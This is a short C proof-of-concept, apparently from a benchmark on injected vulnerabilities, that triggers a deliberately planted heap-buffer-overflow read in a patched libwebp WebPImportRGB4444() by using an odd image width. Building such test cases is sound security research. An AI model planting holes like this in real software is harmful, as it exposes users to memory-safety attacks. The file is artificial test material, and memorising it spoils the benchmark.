// PoC for the single-commit benchmark arm (regime B, strategy new_vuln).
//
// WebPImportRGB4444() is called with an in-contract input: the picture
// dimensions are set beforehand and the packed 16-bit buffer holds exactly
// width * height * 2 bytes. The image width is odd (7), which makes the
// two-pixels-per-iteration unpacking in the patched WebPImportRGB4444()
// walk two bytes past the end of the input buffer while filling the last
// row. Under AddressSanitizer this is reported as a heap-buffer-overflow
// READ of size 1 and the process aborts.
//
// On the pinned parent revision the same program runs to completion: the
// parent importer reads exactly 2 bytes per pixel and stays in bounds.

#include <stdio.h>
#include <stdlib.h>

#include "webp/encode.h"
#include "extras/extras.h"

#define WIDTH 7   // odd on purpose: the last row leaves an unpaired pixel
#define HEIGHT 5

int main(void) {
  const size_t size = (size_t)WIDTH * HEIGHT * 2;  // exact contract size
  uint8_t* const rgb4444 = (uint8_t*)malloc(size);
  WebPPicture pic;
  size_t i;

  if (rgb4444 == NULL) return 1;
  for (i = 0; i < size; ++i) {
    rgb4444[i] = (uint8_t)(0x11 * i + 0x5a);  // deterministic pattern
  }

  if (!WebPPictureInit(&pic)) return 1;
  pic.width = WIDTH;
  pic.height = HEIGHT;

  if (!WebPImportRGB4444(rgb4444, &pic)) {
    fprintf(stderr, "import failed\n");
    return 1;
  }
  printf("imported %dx%d, argb[0]=0x%08x\n", pic.width, pic.height, pic.argb[0]);

  WebPPictureFree(&pic);
  free(rgb4444);
  printf("no out-of-bounds access reported\n");
  return 0;
}
